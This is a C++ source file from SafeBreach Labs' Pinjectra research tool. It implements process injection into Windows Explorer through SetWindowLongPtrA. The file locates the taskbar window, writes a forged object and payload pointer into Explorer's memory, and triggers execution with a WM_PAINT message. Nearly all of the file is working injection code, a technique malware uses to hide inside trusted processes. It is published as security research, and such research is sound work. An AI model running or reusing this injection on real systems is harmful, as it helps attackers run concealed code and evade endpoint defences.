// Copyright (c) 2019, SafeBreach
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
//  * Redistributions of source code must retain the above copyright notice,
//    this list of conditions and the following disclaimer.
//  * Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
//  * Neither the name of the copyright holder nor the names of its
//    contributors may be used to endorse or promote products derived from
//    this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.

// AUTHORS: Amit Klein, Itzik Kotler
// SEE: https://github.com/SafeBreach-Labs/Pinjectra

#include "SetWindowLongPtrA.h"

CodeViaSetWindowLongPtrA::~CodeViaSetWindowLongPtrA()
{
}

boolean CodeViaSetWindowLongPtrA::inject(DWORD ignored_1, DWORD ignored_2)
{
	TStrDWORD64Map metadata;
	TARGET_PROCESS target;
	PINJECTRA_PACKET* output;
	HWND hWindow = FindWindowA("Shell_TrayWnd", NULL);
	DWORD process_id;
	GetWindowThreadProcessId(hWindow, &process_id);
	printf("hWindow=%p, explorer process_id=%d\n", hWindow, process_id);

	DWORD64 old_obj = GetWindowLongPtrA(hWindow, 0);
	printf("old_obj=0x%016llx\n", old_obj);

	HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, process_id);
	if (h == NULL)
	{
		printf("Error in OpenProcess: 0x%x\n", GetLastError());
		return -1;
	}

	metadata["GetWindowLongPtrA_RETURN_VALUE"] = old_obj;

	target.process = h;
	output = this->m_memwriter->eval_and_write(&target, metadata);

	//CloseHandle(hp);

	//HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, process_id);
	DWORD64 new_obj[2];
	LPVOID target_obj = VirtualAllocEx(h, NULL, sizeof(new_obj), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	new_obj[0] = (DWORD64)target_obj + sizeof(DWORD64); //&(new_obj[1])
	// output->buffer will be equal to VirtualAllocEx return value in the Writer
	new_obj[1] = (DWORD64)output->buffer;
	WriteProcessMemory(h, target_obj, new_obj, sizeof(new_obj), NULL);
	SetWindowLongPtrA(hWindow, 0, (DWORD64)target_obj);
	SendNotifyMessageA(hWindow, WM_PAINT, 0, 0);
	Sleep(1);
	SetWindowLongPtrA(hWindow, 0, old_obj);
}
